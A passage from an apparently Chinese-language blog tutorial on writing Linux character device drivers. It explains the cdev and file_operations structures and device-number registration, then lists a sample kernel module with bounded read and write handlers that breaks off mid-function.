<span class="type">unsigned</span> <span class="type">int</span>        i_blkbits;</span><br><span class="line">    <span class="type">blkcnt_t</span>        i_blocks; <span class="comment">// inode所使用的block数，一个block为512字节</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>  *<span class="title">i_pipe</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">block_device</span> *<span class="title">i_bdev</span>;</span> <span class="comment">// 若是块设备，为其对应的block_device结构体指针</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span>     *<span class="title">i_cdev</span>;</span> <span class="comment">// 若是字符设备，为其对应的cdev结构体指针</span></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/proc/devices</code> 文件可以获知系统中注册的设备，第一列为主设备号，第二列为设备名：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/devices</span><br><span class="line">Character devices:</span><br><span class="line">  <span class="number">1</span> mem</span><br><span class="line">  <span class="number">4</span> /dev/vc/<span class="number">0</span></span><br><span class="line">  <span class="number">4</span> tty</span><br><span class="line">  <span class="number">4</span> ttyS</span><br><span class="line">  <span class="number">5</span> /dev/tty</span><br><span class="line">  <span class="number">5</span> /dev/console</span><br><span class="line">  <span class="number">5</span> /dev/ptmx</span><br><span class="line">  ...</span><br><span class="line">Block devices:</span><br><span class="line"><span class="number">259</span> blkext</span><br><span class="line">  <span class="number">7</span> loop</span><br><span class="line">  <span class="number">8</span> sd</span><br><span class="line">  <span class="number">9</span> md</span><br><span class="line"> <span class="number">11</span> sr</span><br><span class="line"> <span class="number">65</span> sd</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure></div>

<p>查看 <code>/dev</code> 目录可以获知系统中包含的设备文件，日期前的两列对应设备的主设备号和次设备号, 主设备号是与驱动对应的概念，同一类设备一般用相同的主设备号，不同类设备的主设备号一般不同。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -al /dev</span><br><span class="line">total <span class="number">0</span></span><br><span class="line">drwxr-xr-x    <span class="number">8</span> root     root          <span class="number">2940</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">17</span> .</span><br><span class="line">drwxr-xr-x   <span class="number">11</span> root     root             <span class="number">0</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">18</span> ..</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root     root            <span class="number">60</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">17</span> bsg</span><br><span class="line">crw-rw----    <span class="number">1</span> root     root        <span class="number">5</span>,   <span class="number">1</span> May  <span class="number">8</span> <span class="number">14</span>:<span class="number">17</span> console</span><br></pre></td></tr></table></figure></div>

<h3 id="字符驱动设备"><a href="#字符驱动设备" class="headerlink" title="字符驱动设备"></a>字符驱动设备</h3><h4 id="cdev-结构体"><a href="#cdev-结构体" class="headerlink" title="cdev 结构体"></a>cdev 结构体</h4><p><code>cdev</code> 为 linux 描述字符设备的一个结构。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>         <span class="comment">// 内嵌的kobject对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>        <span class="comment">// 所属模块</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span> <span class="comment">// 文件操作结构体</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="type">dev_t</span> dev;                   <span class="comment">// 设备号</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>dev_t</code> 定义了设备号，为 32 位，其中 12 位为主设备号，20 位为次设备号。下面的宏可以获得主设备号和次设备号：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MAJOR(<span class="type">dev_t</span> dev)</span><br><span class="line">MINOR(<span class="type">dev_t</span> dev)</span><br></pre></td></tr></table></figure></div>

<p>Linux 内核提供了一组函数用于操作 <code>cdev</code> 结构体：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_operations *)</span>; <span class="comment">// 用于初始化cdev的成员，并建立cdev和file_operations之间的连接</span></span><br><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span>; <span class="comment">// 用于动态申请一个cdev内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span>;</span><br><span class="line"><span class="comment">// 用向系统添加和删除一个cdev，完成字符设备的注册和注销</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span>, <span class="type">unsigned</span>)</span>; <span class="comment">// 通常在字符设备驱动模块加载函数中调用</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span>; <span class="comment">// 字符设备驱动模块卸载函数中调用</span></span><br></pre></td></tr></table></figure></div>

<p>在调用 <code>cdev_add()</code> 函数向系统注册字符设备之前，应首先调用 <code>register_chrdev_region()</code> 或 <code>alloc_chrdev_region()</code> 函数向系统申请设备号：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br></pre></td></tr></table></figure></div>

<p><code>register_chrdev_region()</code> 函数用于已知起始设备的设备号的情况，而 <code>alloc_chrdev_region()</code> 用于设备号未知，向系统动态申请未被占用的设备号的情况。</p>
<h4 id="file-operations-结构体"><a href="#file-operations-结构体" class="headerlink" title="file_operations 结构体"></a>file_operations 结构体</h4><p><code>file_operations</code> 结构体中的成员函数是字符设备驱动程序设计的主体内容，这些函数实际会在应用程序进行 Linux 的 <code>open()</code> 、<code>write()</code> 、<code>read()</code> 、<code>close()</code> 等系统调用时最终被内核调用。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*aio_read) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*aio_write) (<span class="keyword">struct</span> kiocb *, <span class="type">const</span> <span class="keyword">struct</span> iovec *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">loff_t</span>);</span><br><span class="line">    <span class="type">int</span> (*readdir) (<span class="keyword">struct</span> file *, <span class="type">void</span> *, <span class="type">filldir_t</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*aio_fsync) (<span class="keyword">struct</span> kiocb *, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">int</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>下面对 <code>file_operations</code> 结构体中的主要成员简要介绍：</p>
<ul>
<li><code>llseek()</code> 函数用来修改一个文件的当前读写位置，并将新位置返回，在出错时，这个函数返回一个负值。</li>
<li><code>read()</code> 函数用来从设备中读取数据，成功时函数返回读取的字节数，出错时返回一个负值。</li>
<li><code>write()</code> 函数向设备发送数据，成功时该函数返回写入的字节数。如果次函数未被实现，当用户进行 <code>write()</code> 系统调用时，将得到 <code>-EINVAL</code> 返回值。</li>
<li><code>unlocked_ioctl()</code> 提供设备相关控制命令的实现，当调用成功时，返回给调用程序一个非负值。</li>
</ul>
<h3 id="内核模块编写"><a href="#内核模块编写" class="headerlink" title="内核模块编写"></a>内核模块编写</h3><p>单独建立一个文件夹来编写代码。</p>
<p><strong>源代码</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* linux/module.h是Linux内核模块变成必须包含的头文件</span></span><br><span class="line"><span class="comment">* 头文件kernel.h包含了常用的内核函数</span></span><br><span class="line"><span class="comment">* 头文件init.h包含了宏_init和_exit,它们允许释放内核占用的内存。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_major = <span class="number">230</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello_minor = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 参数必须使用module_param宏来声明，这个宏在moduleparam.h中定义。</span></span><br><span class="line"><span class="comment">* module_param需要三个参数：变量的名称、类型以及用于sysfs入口项的访问许可掩码，</span></span><br><span class="line"><span class="comment">* 这个宏必须放在任何函数之外，通常在源文件头部。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">module_param(hello_major, <span class="type">int</span>, S_IRUGO);</span><br><span class="line">module_param(hello_minor, <span class="type">int</span>, S_IRUGO);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MAX_SIZE];</span><br><span class="line">&#125; * hello_devp;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">hello_fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .llseek = hello_llseek,</span><br><span class="line">        .read = hello_read,</span><br><span class="line">        .write = hello_write,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">        .open = hello_open,</span><br><span class="line">        .release = hello_releace,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* hello_init函数是模块初始化函数，他会在内核模块被加载的时候执行，使用__init进行修饰，一般用它来初始化数据结构等内容； */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">dev_t</span> devno = MKDEV(hello_major, hello_minor);</span><br><span class="line">    <span class="keyword">if</span> (hello_major)</span><br><span class="line">        ret = register_chrdev_region(devno, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        ret = alloc_chrdev_region(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;myko&quot;</span>);</span><br><span class="line">        hello_major = MAJOR(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) <span class="keyword">return</span> ret;</span><br><span class="line">    hello_devp = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> hello_dev), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!hello_devp) &#123;</span><br><span class="line">        unregister_chrdev_region(devno, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line">    cdev_init(&amp;hello_devp-&gt;cdev, &amp;hello_fops);</span><br><span class="line">    hello_devp-&gt;cdev.owner = THIS_MODULE;</span><br><span class="line">    <span class="type">int</span> err = (<span class="type">int</span>) cdev_add(&amp;hello_devp-&gt;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) printk(<span class="string">&quot;[-] Error %d adding myko %d\n&quot;</span>, err, hello_minor);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">* 函数module_init()和clearnup_exit()是模块编程中最基本也是必须得两个函数，它用来指定模块加载和退出时调用的函数，</span></span><br><span class="line"><span class="comment">* 这里加载的是我们定义好的两个函数，module_init()向内核注册模块提供新功能，而cleanup_exit()注销由模块提供的所用功能。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">module_init(hello_init);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* hello_exit函数是模块的退出函数，他会在模块在退出的时候执行。 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    cdev_del(&amp;hello_devp-&gt;cdev);</span><br><span class="line">    kfree(hello_devp);</span><br><span class="line">    unregister_chrdev_region(MKDEV(hello_major, hello_minor), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_open</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">    filp-&gt;private_data = hello_devp;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_releace</span><span class="params">(<span class="keyword">struct</span> inode *id, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">    filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        printk(<span class="string">&quot;[-] No device\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> MEM_CLEAR:</span><br><span class="line">            <span class="built_in">memset</span>(dev-&gt;mem, <span class="number">0</span>, <span class="keyword">sizeof</span>(dev-&gt;mem));</span><br><span class="line">            printk(<span class="string">&quot;[+] Clear success\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            printk(<span class="string">&quot;[-] Error command\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_read</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buf, dev-&gt;mem + *pos, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    printk(<span class="string">&quot;[+] Read %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hello_dev</span> *<span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(dev-&gt;mem + *pos, buf, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    printk(<span class="string">&quot;[+] Written %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">0</span> 